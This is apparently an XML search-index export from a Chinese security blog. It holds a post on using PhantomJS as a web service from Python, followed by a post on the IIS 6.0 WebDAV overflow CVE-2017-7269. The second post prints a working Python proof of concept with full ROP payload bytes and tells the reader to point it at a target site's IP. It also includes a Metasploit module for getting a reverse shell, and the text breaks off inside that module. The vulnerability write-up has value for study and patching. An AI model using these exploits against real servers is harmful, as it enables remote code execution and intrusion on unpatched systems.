<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Phantomjs正确打开方式]]></title>
      <url>http://thief.one/2017/03/31/Phantomjs%E6%AD%A3%E7%A1%AE%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">你是如何走出人生的阴霾的？<br>多走几步</blockquote>

<p>　　前段时间分析了<a href="http://thief.one/2017/03/01/Phantomjs%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/">Selenium+Phantomjs的使用方法以及性能优化问题</a>，期间也分析了利用<a href="http://thief.one/2017/03/01/Phantomjs%E7%88%AC%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/">Selenium+phantomjs爬虫爬过的一些坑问题</a>。然而在使用phantomjs的过程中，并没有正真提升phantomjs的性能，爬虫性能也没有很好的提升。经过网友的提醒，发现其实是使用phantomjs的方法出了问题，因此无论怎么优化，都不能从根本上去提升性能。那么本篇就来好好说说，Phantomjs正确的打开方式。<br><a id="more"></a></p>
<h3 id="抛弃selenium-phantomjs"><a href="#抛弃selenium-phantomjs" class="headerlink" title="抛弃selenium+phantomjs"></a>抛弃selenium+phantomjs</h3><p>　　之前我一直使用selenium去使用phantomjs，原因是因为selenium封装了phantomjs一部分功能，selenium又提供了python的接口模块，在python语言中可以很好地去使用selenium，间接地就可以使用phantomjs。然而，我现在要说的是，是时候抛弃selenium+phantomjs了，原因之一此封装的接口很久没有更新了（没人维护了），原因之二selenium只实现了一部分phantomjs功能，且很不完善。</p>
<h3 id="phantomjs-APi"><a href="#phantomjs-APi" class="headerlink" title="phantomjs APi"></a>phantomjs APi</h3><p>　　通过查看phantomjs官方介绍，我们可以发现phantomjs的功能异常强大，绝不仅仅是selenium封装的功能那么简陋。phantomjs提供了很多种APi，具体可以查看：<a href="http://thief.one/2017/03/13/Phantomjs-Api%E4%BB%8B%E7%BB%8D/">phantomjs api介绍</a>，其中最常用的要属Phantomjs WebService与Phantomjs WebPage，前者用于开启http服务，后者用于发起http请求。</p>
<h3 id="Phantomjs正确使用方式"><a href="#Phantomjs正确使用方式" class="headerlink" title="Phantomjs正确使用方式"></a>Phantomjs正确使用方式</h3><p>正确打开方式应该使用phantomjs Webservice作为一种web服务的形式（api）,将其与其他语言分离开来（比如python）。</p>
<h4 id="设计流程："><a href="#设计流程：" class="headerlink" title="设计流程："></a>设计流程：</h4><p>　　Python通过http请求下发任务，Phantomjs Webservice获取任务后去处理，处理完以后再将结果返回给Python。任务调度、存储等复杂操作交给Python去做，Python可以写成异步并发去请求Phantomjs Webservice，需要注意的是目前一个Phantomjs Webservice只支持10个并发。但我们可以在一台服务器上多开几个phantomjs Webservice启用不同的端口即可，或者可以多台服务器做个集群，用nginx做反向代理。</p>
<h4 id="Phantomjs-Webservice"><a href="#Phantomjs-Webservice" class="headerlink" title="Phantomjs Webservice"></a>Phantomjs Webservice</h4><p>新建test.js，写入如下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">var webserver = require(<span class="string">'webserver'</span>);</div><div class="line">var server = webserver.create();</div><div class="line">var service = server.listen(8080, <span class="keyword">function</span>(request, response) &#123;</div><div class="line"></div><div class="line">  var postRaw=request.postRaw;</div><div class="line">  var aaa=new Array();</div><div class="line">  aaa=postRaw.split(<span class="string">"="</span>);</div><div class="line">  var url=<span class="string">"http://"</span>+aaa[0];</div><div class="line">  var md5_url=aaa[1];</div><div class="line">  console.log(url); //输出传入的url</div><div class="line"></div><div class="line">  //获取源码</div><div class="line">  var webPage = require(<span class="string">'webpage'</span>);</div><div class="line">  var page = webPage.create();</div><div class="line">  page.open(url, <span class="keyword">function</span> (status) &#123;</div><div class="line">    var url = page.url;</div><div class="line">    console.log(<span class="string">'url: '</span> + url);  //输入获取到的目标网站title</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  // //页面截图</div><div class="line">  // var webPage = require(<span class="string">'webpage'</span>);</div><div class="line">  // var page = webPage.create();</div><div class="line">  // page.viewportSize = &#123; width: 1920, height: 1080 &#125;;</div><div class="line">  // page.open(url, <span class="keyword">function</span> start(status) &#123;</div><div class="line">  //   page.render(md5_url+<span class="string">'.jpg'</span>, &#123;format: <span class="string">'jpg'</span>, quality: <span class="string">'100'</span>&#125;);</div><div class="line">  // &#125;);</div><div class="line"></div><div class="line">  //response返回信息</div><div class="line">  response.status=200;</div><div class="line">  response.write(md5_url+<span class="string">'.jpg'</span>);</div><div class="line">  response.close();</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>作用：处理http请求，获取url，进行截图或者获取源码操作。<br>使用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">phantomjs.exe test.js</div></pre></td></tr></table></figure></p>
<p>会在本地开启web服务，端口为8080。</p>
<h4 id="Python-Client"><a href="#Python-Client" class="headerlink" title="Python Client"></a>Python Client</h4><p>新建http_request.py，写入如下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">import requests</div><div class="line">import md5</div><div class="line">from multiprocessing.dummy import Process</div><div class="line"></div><div class="line">domain_list=[<span class="string">"thief.one"</span>]*10</div><div class="line"></div><div class="line">url=<span class="string">"http://localhost:8080"</span></div><div class="line"></div><div class="line">def http_request(domain):</div><div class="line">    m1 = md5.new()</div><div class="line">    m1.update(domain)</div><div class="line">    md5_domain=m1.hexdigest()</div><div class="line"></div><div class="line">    payload=&#123;domain:md5_domain&#125;</div><div class="line"></div><div class="line">    requests.post(url,data=payload)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">for</span> domain <span class="keyword">in</span> domain_list:</div><div class="line">        t=Process(target=http_request,args=(domain,))</div><div class="line">        t.start()</div></pre></td></tr></table></figure></p>
<p>作用：异步并发下发任务。</p>
<h4 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h4><p>运行python以后，异步下发10个任务，Phantomjs服务器端接收到url并开始处理，并发处理10个任务并输入结果。<br><img src="/upload_image/20170331/1.png" alt=""></p>
<blockquote>
<p>转载请说明出处:<a href="http://thief.one/2017/03/31/Phantomjs正确打开方式/">Phantomjs正确打开方式 | nMask’Blog</a><br>本文地址：<a href="http://thief.one/2017/03/31/Phantomjs正确打开方式/">http://thief.one/2017/03/31/Phantomjs正确打开方式/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Phantomjs </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IIS6.0远程命令执行漏洞(CVE-2017-7269)]]></title>
      <url>http://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">天赋决定了你能达到的上限，努力程度决定了你能达到的下限<br>以绝大多数人的努力程度之低，远远没有达到要去拼天赋的地步</blockquote>本文用于记录IIS6.0 WebDav 远程命令执行漏洞的相关信息，检测利用方法以及修复方案，内容大多来自互联网，在此记录备忘。<br><a id="more"></a><br>免责申明：<em>文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负</em></p>
<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>漏洞编号：CVE-2017-7269<br>发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院）<br>漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。<br>漏洞类型：缓冲区溢出<br>漏洞等级：高危<br>影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）<br>触发函数：ScStoragePathFromUrl函数<br>附加信息：ScStoragePathFromUrl函数被调用了两次<br>漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>iis6.0</li>
<li>开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200）</li>
<li>windows server 2003 R2</li>
</ul>
<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.</span></div><div class="line"><span class="comment">#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China </span></div><div class="line"><span class="comment">#-----------Email: edwardz@foxmail.com</span></div><div class="line">import socket  </div><div class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </div><div class="line">sock.connect((<span class="string">'127.0.0.1'</span>,80))  </div><div class="line">pay=<span class="string">'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'</span></div><div class="line">pay+=<span class="string">'If: &lt;http://localhost/aaaaaaa'</span></div><div class="line">pay+=<span class="string">'\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'</span></div><div class="line">pay+=<span class="string">'&gt;'</span></div><div class="line">pay+=<span class="string">' (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb'</span></div><div class="line">pay+=<span class="string">'\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'</span></div><div class="line">shellcode=<span class="stringspan></div><div class="line">pay+=shellcode</div><div class="line">pay+=<span class="string">'&gt;\r\n\r\n'</span></div><div class="line"><span class="built_in">print</span> pay</div><div class="line">sock.send(pay)  </div><div class="line">data = sock.recv(80960)  </div><div class="line"><span class="built_in">print</span> data </div><div class="line">sock.close</div></pre></td></tr></table></figure>
<p><em>poc来自：<a href="https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py" target="_blank" rel="external">https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py</a></em></p>
<p>修改代码sock.connect((‘127.0.0.1’,80))，将其中ip地址改为目标网站ip，运行该py文件，会在目标服务器上产生一个calc进程（计算器）。</p>
<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>以上poc只是用来验证此漏洞是否存在，但需要登录的服务器上查看进程才能确定。经过国外大牛的加工，编写了一个利用msf反弹shell的ruby脚本。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">require <span class="string">'msf/core'</span></div><div class="line"></div><div class="line">class MetasploitModule &lt; Msf::Exploit::Remote</div><div class="line">  Rank = GoodRanking</div><div class="line"></div><div class="line">  include Msf::Exploit::Remote::Tcp</div><div class="line"></div><div class="line">  def initialize(info = &#123;&#125;)</div><div class="line">    super(update_info(info,</div><div class="line">      <span class="string">'Name'</span>           =&gt; <span class="string">'CVE-2017-7269 Microsoft IIS WebDav ScStoragePathFromUrl Overflow'</span>,</div><div class="line">      <span class="string">'Description'</span>    =&gt; %q&#123;</div><div class="line">          Buffer overflow <span class="keyword">in</span> the ScStoragePathFromUrl <span class="keyword">function</span> <span class="keyword">in</span> the WebDAV service <span class="keyword">in</span> Internet Information Services (IIS) 6.0 <span class="keyword">in</span> Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with <span class="string">"If: &lt;http://"</span> <span class="keyword">in</span> a PROPFIND request, as exploited <span class="keyword">in</span> the wild <span class="keyword">in</span> July or August 2016.</div><div class="line">          Original exploit by Zhiniang Peng and Chen Wu.</div><div class="line">      &#125;,</div><div class="line">      <span class="string">'Author'</span>         =&gt; [ <span class="string">'Dominic Chell &lt;dominic@mdsec.co.uk&gt;'</span> ],</div><div class="line">      <span class="string">'License'</span>        =&gt; MSF_LICENSE,</div><div class="line">      <span class="string">'References'</span>     =&gt;</div><div class="line">        [</div><div class="line">          [ <span class="string">'CVE'</span>, <span class="string">'CVE-2017-7269'</span>],</div><div class="line">          [ <span class="string">'BID'</span>, <span class="string">'97127'</span>],</div><div class="line">          [ <span class="string">'URL'</span>, <span class="string">'https://github.com/edwardz246003/IIS_exploit'</span>],</div><div class="line">        ],</div><div class="line">      <span class="string">'Privileged'</span>     =&gt; <span class="literal">false</span>,</div><div class="line">      <span class="string">'Payload'</span>        =&gt;</div><div class="line">        &#123;</div><div class="line">          <span class="string">'Space'</span>       =&gt; 2000,</div><div class="line">          <span class="string">'BadChars'</span>    =&gt; <span class="string">"\x00"</span>,</div><div class="line">          <span class="string">'EncoderType'</span>   =&gt; Msf::Encoder::Type::AlphanumUnicodeMixed,</div><div class="line">          <span class="string">'DisableNops'</span>  =&gt;  <span class="string">'True'</span>,</div><div class="line">          <span class="string">'EncoderOptions'</span> =&gt;</div><div class="line">            &#123;</div><div class="line">              <span class="string">'BufferRegister'</span> =&gt; <span class="string">'ESI'</span>,</div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line">      <span class="string">'DefaultOptions'</span> =&gt;</div><div class="line">        &#123;</div><div class="line">          <span class="string">'EXITFUNC'</span> =&gt; <span class="string">'process'</span>,</div><div class="line">          <span class="string">'PrependMigrate'</span> =&gt; <span class="literal">true</span>,</div><div class="line">          <span class="string">'PrependMigrateProc'</span> =&gt; <span class="string">"calc"</span></div><div class="line">        &#125;,</div><div class="line">      <span class="string">'Targets'</span>        =&gt;</div><div class="line">        [</div><div class="line">          [</div><div class="line">            <span class="string">'Microsoft Windows Server 2003 R2'</span>,</div><div class="line">            &#123;</div><div class="line">              <span class="string">'Platform'</span> =&gt; <span class="string">'win'</span>,</div><div class="line">            &#125;,</div><div class="line">          ],</div><div class="line">        ],</div><div class="line">      <span class="string">'Platform'</span>       =&gt; <span class="string">'win'</span>,</div><div class="line">      <span class="string">'DisclosureDate'</span> =&gt; <span class="string">'March 26 2017'</span>,</div><div class="line">      <span class="string">'DefaultTarget'</span> =&gt; 0))</div><div class="line"></div><div class="line">    register_options(</div><div class="line">      [</div><div class="line">        Opt::RPORT(80)</div><div class="line">      ], self.class)</div><div class="line">  end</div><div class="line"></div><div class="line">  def exploit</div><div class="line">    connect</div><div class="line"></div><div class="line">    buf1 = <span class="string">"If: &lt;http://localhost/aaaaaaa"</span></div><div class="line">    buf1 &lt;&lt; <span class="string">"\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac"</span></div><div class="line">    buf1 &lt;&lt; <span class="string">"&gt;"</span></div><div class="line">    buf1 &lt;&lt; <span class="string">" (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb"</span></div><div class="line">    buf1 &lt;&lt; <span class="string">"\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe